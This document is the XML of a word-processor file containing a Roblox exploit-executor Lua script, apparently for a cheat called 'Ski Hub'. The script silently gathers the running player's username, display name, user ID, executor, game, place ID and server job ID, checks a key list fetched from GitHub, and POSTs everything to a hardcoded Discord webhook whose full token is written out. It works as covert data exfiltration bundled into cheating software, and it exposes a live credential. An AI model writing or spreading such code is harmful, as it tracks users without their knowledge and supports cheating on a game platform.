        <w:t>local WEBHOOK = "https://discord.com/api/webhooks/1434580393394307173/zQEclNo_vm3WOwfhJttuc_eo6NPyGd80lmli7N_JqgaGzmGbHVweMtQrPma3CPJgTHXJ"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local KEY_URL = "https://raw.githubusercontent.com/xdomestos1-art/41414141414141414141/refs/heads/main/41414141414141414141/41414141414141414141-main/123123b1j3%C4%B1b123jb1%C4%B1bj3/94989894214444/123b213b213b213b.json"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local HttpService = game:GetService("HttpService")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local Players = game:GetService("Players")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local Market = game:GetService("MarketplaceService")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local Player = Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local username = Player.Name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local displayName = Player.DisplayName</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local userid = Player.UserId</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local jobId = game.JobId ~= "" and game.JobId or "Studio / Private"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    .. userid .. "&amp;width=420&amp;height=420&amp;format=png"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local executor = (identifyexecutor or getexecutorname or function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return "Unknown"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local gameName = "Unknown"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    gameName = Market:GetProductInfo(game.PlaceId).Name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local key = "Not Found"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local success, raw = pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return game:HttpGet(KEY_URL, true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if success and raw ~= "" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local tbl = HttpService:JSONDecode(raw)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if typeof(tbl) == "table" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for k, v in pairs(tbl) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if tostring(v) == username then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    key = tostring(k)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    break</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end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end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>task.wait(4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local payload = HttpService:JSONEncode({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    username = "Ski Hub Logger",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    avatar_url = avatar, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    embeds = {{</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        title = "🚀 Script Executed",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        description = "**Ski Hub** Script Executed",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        color = key ~= "Not Found" and 0x2ECC71 or 0xE74C3C,</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        author = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            name = username .. " (" .. displayName .. ")",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            icon_url = avatar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        thumbnail = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            url = avatar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        fields = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = "User",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                value = "**" .. username .. "**\n`" .. userid .. "`",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                inline =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name = "Executor",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                value = executor,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                inline =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name = "Key Status",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                value = key ~= "Not Found" and "✅ Valid" or "❌ Invalid / None",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                inline =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name = "Key",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                value = "```" .. key .. "```",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                inline = false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name = "Game",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                value = gameName,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                inline = false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name = "Place ID",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                value = "`" .. game.PlaceId .. "`",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                inline =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name = "Job ID",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                value = "```" .. jobId .. "```",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                inline = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        footer = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            text = "Ski Hub Security • execute log",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            icon_url = avatar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        timestamp = DateTime.now():ToIsoDate()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    }}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local req =</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    syn and syn.request</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    or http_request</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    or request</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    or (http and http.request)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    or (fluxus and fluxus.request)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    or getgenv().request</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if req then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        req({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Url = WEBHOOK,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Method = "POST",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Headers = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ["Content-Type"] = "application/json"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Body = payload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    warn("noreq")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if Library and Library.SetTheme then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Library:SetTheme("Dark")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)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